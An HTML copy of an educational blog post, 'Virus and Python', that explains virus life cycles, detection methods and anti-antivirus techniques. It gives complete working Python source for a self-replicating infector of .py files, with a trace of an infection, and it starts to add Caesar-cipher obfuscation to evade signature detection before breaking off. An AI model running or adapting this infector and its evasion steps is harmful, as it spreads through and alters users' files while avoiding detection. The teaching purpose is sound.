@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Virus and Python - Hackliza</title>
+  <meta name="description" content="This post will explain several issues when it comes to understanding how a virus works. They will first be explained what they are and how is its life cycle. The main techniques for detecting a virus will be outlined below. After, the main anti-antivirus techniques will be discussed. Then, it will be explained how a virus works by providing examples of code, to finally add various enhancements and protections so that it cannot be detected by signature."><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Hackliza",
+    
+    "url": "https:\/\/hackliza.gal\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/hackliza.gal\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/en\/posts\/virus_python\/",
+          "name": "Virus and python"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Guzmán Cernadas Pérez"
+  },
+  "headline": "Virus and Python",
+  "description" : "This post will explain several issues when it comes to understanding how a virus works. They will first be explained what they are and how is its life cycle. The main techniques for detecting a virus will be outlined below. After, the main anti-antivirus techniques will be discussed. Then, it will be explained how a virus works by providing examples of code, to finally add various enhancements and protections so that it cannot be detected by signature.",
+  "inLanguage" : "en",
+  "wordCount":  5014 ,
+  "datePublished" : "2020-12-14T00:00:00",
+  "dateModified" : "2020-12-14T00:00:00",
+  "image" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+  "keywords" : [ "python, malware, obfuscation" ],
+  "mainEntityOfPage" : "https:\/\/hackliza.gal\/en\/posts\/virus_python\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/hackliza.gal\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Virus and Python" />
+<meta property="og:description" content="This post will explain several issues when it comes to understanding how a virus works. They will first be explained what they are and how is its life cycle. The main techniques for detecting a virus will be outlined below. After, the main anti-antivirus techniques will be discussed. Then, it will be explained how a virus works by providing examples of code, to finally add various enhancements and protections so that it cannot be detected by signature.">
+<meta property="og:image" content="https://hackliza.gal/img/hackliza.png" />
+<meta property="og:url" content="https://hackliza.gal/en/posts/virus_python/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Hackliza" />
+
+  <meta name="twitter:title" content="Virus and Python" />
+  <meta name="twitter:description" content="This post will explain several issues when it comes to understanding how a virus works. They will first be explained what they are and how is its life cycle. The main techniques for detecting a virus …">
+  <meta name="twitter:image" content="https://hackliza.gal/img/hackliza.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@hackliza" />
+  <meta name="twitter:creator" content="@hackliza" />
+  <link href='https://hackliza.gal/img/hackliza.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.74.3" />
+  <link rel="alternate" href="https://hackliza.gal/en/index.xml" type="application/rss+xml" title="Hackliza"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://hackliza.gal/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://hackliza.gal/css/syntax.css" /><link rel="stylesheet" href="https://hackliza.gal/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><style>
+ nav {
+     background: #0099CC !important;
+ }
+
+ .navbar-brand, #main-navbar ul li a, footer {
+     color: #fff !important;
+ }
+
+ .navbar-brand:hover, #main-navbar ul li a:hover {
+     color: #ccc !important;
+ }
+
+
+ figure {
+     margin-top: 1.5em; 
+     margin-bottom: 1.5em; 
+ }
+ 
+ figcaption {
+     text-align: center;
+     font-size: 85%;
+ }
+
+ pre {
+     overflow-x: auto !important;
+ }
+
+ .posts-heading {
+     text-align: center;
+ }
+ 
+</style>
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://hackliza.gal/en/">Hackliza</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="/en/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="/en/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Talks" href="/en/talks/">Talks</a>
+            </li>
+          
+        
+
+        
+          
+            <li>
+              
+                
+              
+                
+                  <a href="/gl" lang="gl">gl</a>
+                
+              
+            </li>
+          
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Hackliza" href="https://hackliza.gal/en/">
+            <img class="avatar-img" src="https://hackliza.gal/img/hackliza.png" alt="Hackliza" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              
+                <h1>Virus and Python</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p>This post will explain several issues when it comes to understanding how a virus works. They will first be explained 
+what they are and how is its life cycle. The main techniques for detecting a virus will be outlined below. After, the 
+main anti-antivirus techniques will be discussed. Then, it will be explained how a virus works by providing examples of 
+code, to finally add various enhancements and protections so that it cannot be detected by signature.</p>
+<p>Warning: The purpose of this publication is educational. Under no circumstances will Hackliza members be held 
+responsible for to be done with this code.</p>
+<h1 id="what-is-a-virus">What is a virus?</h1>
+<p>A virus is a program capable of copying itself to other files. The life cycle of a virus usually consists of three 
+phases:</p>
+<ul>
+<li>Infection: at this stage the virus spreads through the system, looking for possible files to reproduce and finally to 
+copy. There are two types of infection:
+<ul>
+<li>Passive: the user of a system copies the virus somewhere and runs it.</li>
+<li>Active: the virus exploits some vulnerability to infect the system.</li>
+</ul>
+</li>
+<li>Incubation: at this stage the virus seeks to stay in the system as long as possible.</li>
+<li>Illness: at this stage is when the actions not desired by the user are performed.</li>
+</ul>
+<h1 id="how-is-a-virus-detected">How is a virus detected?</h1>
+<p>When detecting a virus, several techniques are used:</p>
+<p><strong>Static techniques</strong>. These techniques examine infected or original files without executing the code. Some examples of 
+these techniques are:</p>
+<ul>
+<li>Search for viral signatures: it consists of creating a signature of a characteristic of the virus and searching for 
+it. A characteristic can be a string, a sequence of instructions, or a mark used by the virus detection mechanism.</li>
+<li>Spectral analysis: consists of looking for suspicious instructions used by other malicious software. For example, a 
+suspicious statement would be &ldquo;a = a + 0&rdquo;, which does not change the behavior of the virus, but can be used to modify 
+this signature.</li>
+<li>Heuristic analysis: consists of analyzing the behavior of a program, to detect possible malicious actions.</li>
+</ul>
+<p><strong>Dynamic techniques</strong>. These techniques run the suspicious code and decide if it is malware or not based on it 
+observed behavior. Some of these techniques are:</p>
+<ul>
+<li>Behavior monitoring: the memory-based antivirus will try to detect any suspicious activity and stop it. To observe 
+the behavior of a program on Linux, the antivirus will track calls made at 13H and 21H interrupts. For Windows, calls 
+to the operating system API will be tracked.</li>
+<li>Code emulation (Sandboxing): the suspicious program runs on an emulated system to see its behavior.</li>
+</ul>
+<p><strong>Checking the integrity of the files</strong>. In this technique it is checked if a file has been modified by checking the 
+hash every so often.</p>
+<h1 id="anti-antivirus-techniques">Anti-antivirus techniques</h1>
+<p>These types of techniques are used to prevent an antivirus from detecting malicious code. Some of them are:</p>
+<p><strong>Stealth techniques</strong>: are a set of techniques whose goal is to convince the user that nothing bad is happening. Some 
+examples of these techniques are:</p>
+<ul>
+<li>Hooking for interruptions or calls made to the Windows API.</li>
+<li>Delete your own executable.</li>
+<li>Detection of a sandbox not to run.</li>
+</ul>
+<p><strong>Polymorphism</strong>: these are techniques aimed at avoiding signature detection. Such techniques cause the program code to 
+be rewritten (in this type of modification the behavior of the virus is not changed, unless junk instructions such as 
+NOP or add eax, 0 are added) or parts of it are encrypted.</p>
+<p><strong>Metamorphism</strong>: these are techniques aimed at avoiding signature detection and behavioral detection. These types of 
+techniques cause the program code to be rewritten by changing its functionalities. Some techniques of metamorphism are:</p>
+<ul>
+<li>Divide an instruction into two or more.</li>
+<li>Convert two instructions into one.</li>
+<li>Adding dead code.</li>
+</ul>
+<p><strong>Other more intrusive techniques</strong> are: killing the antivirus process, uninstalling the antivirus, or corrupting the 
+antivirus signature database.</p>
+<h1 id="creation-and-operation-of-a-virus">Creation and operation of a virus</h1>
+<p>Python will be used as a programming language to teach how a virus works. This language was chosen because of the 
+little complexity involved in creating and reading code.</p>
+<p>Note: None of the viruses taught in this publication will contain a malicious function in order to prevent havoc. It 
+should also be noted that in all the infection functions presented, only the directory from which the virus runs is 
+considered.</p>
+<h2 id="creation-of-a-virus">Creation of a virus</h2>
+<p>The virus presented below will have the functionality to self-replicate and display a message on the screen when the 
+infection process is complete. Another feature is that the virus is written to the beginning of each infected file, 
+causing that if a file containing the virus is executed, the malicious code is executed before the legitimate code.</p>
+<p>Without further ado prepares to explain that make each of the parts of the virus:</p>
+<ul>
+<li><strong>infect</strong> function: this function looks for possible files to infect in the folder where the virus is running. Once 
+you find a candidate, check to see if they are already infected. If it is not, a new file will be created containing 
+the virus and the candidate code.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(path):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            script<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;# Virus:Start&#34;</span> <span style="color:#f92672">in</span> text_script:
+                infected <span style="color:#f92672">=</span> open(file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infected&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+                infected<span style="color:#f92672">.</span>write(virus <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+                infected<span style="color:#f92672">.</span>write(text_script)
+                infected<span style="color:#f92672">.</span>close()
+                os<span style="color:#f92672">.</span>remove(file)
+                os<span style="color:#f92672">.</span>rename(file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infected&#34;</span>, file)
+</code></pre></div><ul>
+<li><strong>payload</strong> function: this function would contain the malicious code. In this case, only the message &ldquo;You were 
+infected&rdquo; is printed on the screen.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You were infected&#34;</span>)
+</code></pre></div><ul>
+<li><strong>run</strong> function: this function calls the infect and payload functions.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(virus):
+    infect(virus)
+    payload()
+</code></pre></div><ul>
+<li><strong>Global code</strong>: This code reads the running file, extracts the virus code, and calls the run function.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+text_host <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> text_host[text_host<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;# Virus:Start&#34;</span>):text_host<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;# Virus:End&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;# Virus:End&#34;</span>)]
+run(virus)
+</code></pre></div><p>The virus code is located between two comments: #Virus:Start and #Virus:End. These comments are intended to know the 
+location of the viral code in any file (both infected and original).</p>
+<p>Once the functions of the virus have been explained in detail, its final code is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Virus:Start</span>
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> sys
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(path):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            script<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;# Virus:Start&#34;</span> <span style="color:#f92672">in</span> text_script:
+                infected <span style="color:#f92672">=</span> open(file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infected&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+                infected<span style="color:#f92672">.</span>write(virus <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+                infected<span style="color:#f92672">.</span>write(text_script)
+                infected<span style="color:#f92672">.</span>close()
+                os<span style="color:#f92672">.</span>remove(file)
+                os<span style="color:#f92672">.</span>rename(file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infected&#34;</span>, file)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You were infected&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(virus):
+    infect(virus)
+    payload()
+
+
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+text_host <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> text_host[text_host<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;# Virus:Start&#34;</span>):text_host<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;# Virus:End&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;# Virus:End&#34;</span>)]
+run(virus)
+<span style="color:#75715e"># Virus:End</span>
+</code></pre></div><p>If you run this code in a folder with other files with the .py extension, you will get the following result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus1$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:14 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:05 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">22</span> Dec <span style="color:#ae81ff">14</span> 11:14 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">850</span> Dec <span style="color:#ae81ff">14</span> 11:14 virus.py
+probasvx@probasvx:~/virus1$ cat hello.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello world!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus1$ python3 virus.py 
+You were infected
+probasvx@probasvx:~/virus1$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:15 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:05 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">871</span> Dec <span style="color:#ae81ff">14</span> 11:15 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">850</span> Dec <span style="color:#ae81ff">14</span> 11:14 virus.py
+probasvx@probasvx:~/virus1$ cat hello.py 
+<span style="color:#75715e"># Virus:Start</span>
+import os
+import sys
+
+
+def infect<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>:
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> file in os.listdir<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>:
+        <span style="color:#66d9ef">if</span> file.endswith<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.py&#34;</span><span style="color:#f92672">)</span>:
+            script <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>file, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>
+            text_script <span style="color:#f92672">=</span> script.read<span style="color:#f92672">()</span>
+            script.close<span style="color:#f92672">()</span>
+            <span style="color:#66d9ef">if</span> not <span style="color:#e6db74">&#34;# Virus:Start&#34;</span> in text_script:
+                infected <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>file + <span style="color:#e6db74">&#34;.infected&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span>
+                infected.write<span style="color:#f92672">(</span>virus + <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span>
+                infected.write<span style="color:#f92672">(</span>text_script<span style="color:#f92672">)</span>
+                infected.close<span style="color:#f92672">()</span>
+                os.remove<span style="color:#f92672">(</span>file<span style="color:#f92672">)</span>
+                os.rename<span style="color:#f92672">(</span>file + <span style="color:#e6db74">&#34;.infected&#34;</span>, file<span style="color:#f92672">)</span>
+
+
+def payload<span style="color:#f92672">()</span>:
+    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;You were infected&#34;</span><span style="color:#f92672">)</span>
+
+
+def run<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>:
+    infect<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>
+    payload<span style="color:#f92672">()</span>
+
+
+host <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>
+text_host <span style="color:#f92672">=</span> host.read<span style="color:#f92672">()</span>
+host.close<span style="color:#f92672">()</span>
+virus <span style="color:#f92672">=</span> text_host<span style="color:#f92672">[</span>text_host.find<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:Start&#34;</span><span style="color:#f92672">)</span>:text_host.rfind<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:End&#34;</span><span style="color:#f92672">)</span> + len<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:End&#34;</span><span style="color:#f92672">)]</span>
+run<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>
+<span style="color:#75715e"># Virus:End</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello world!&#34;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>In this trace you can see how after the execution of the virus, the file hello.py has increased in size, as it now 
+contains the virus code.</p>
+<p>The main weakness of this virus is that the code is contained between the comments &ldquo;#Virus:Start&rdquo; and &ldquo;#Virus:End&rdquo;. 
+With this data an antivirus is able to detect and remove the code in a trivial way. On the other hand, as the code is 
+always the same, it can be used as a virus signature for detection.</p>
+<h2 id="correcting-weaknesses">Correcting weaknesses</h2>
+<p>In view of the weaknesses of the previous virus, then a protection will be added which will encrypt the code so that, 
+on the one hand the encryption is different after each infection (and therefore the signing of the code as well) and on 
+the other so that analysts find it harder to know what the code does. Another thing that changes is that in this virus 
+will stop using the comments &ldquo;#Virus:Start&rdquo; and &ldquo;#Virus:End&rdquo; as they are evidence of the virus itself. Finally, 
+infected files will have the virus code at the end instead of the beginning.</p>
+<p>The malware below will be a germ, this is a plain text program that will generate a virus (in this case with an 
+encrypted part). This germ will contain a function to encrypt and another to decrypt the code, it will also have a 
+function for calculating the key with which the data is encrypted.</p>
+<p>The different parts of the germ that will be created are the following:</p>
+<ul>
+<li><strong>calculate_key</strong> function: this function calculates the encryption key from the first letters of a file. In case the 
+file contains less than 3 letters the returned key is 42.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_key</span>(text):
+    <span style="color:#66d9ef">if</span> len(text) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        key <span style="color:#f92672">=</span> ord(text[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+</code></pre></div><ul>
+<li><strong>decrypt</strong> function: this function decrypts encrypted text with Caesar cipher.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+</code></pre></div><ul>
+<li><strong>encrypt</strong> function: this function encrypts a text with Caesar cipher.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
+    encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            encrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> encrypted_text
+</code></pre></div><p>Note: The encryption and decryption functions have only changed uppercase and lowercase letters. The rest of the 
+characters leave us the same.</p>
+<ul>
+<li><strong>infect</strong> function: this function searches the folder from where the virus is running for files that have the .py 
+extension to infect them. If there is a file with this extension, the file will be opened and it will be checked if 
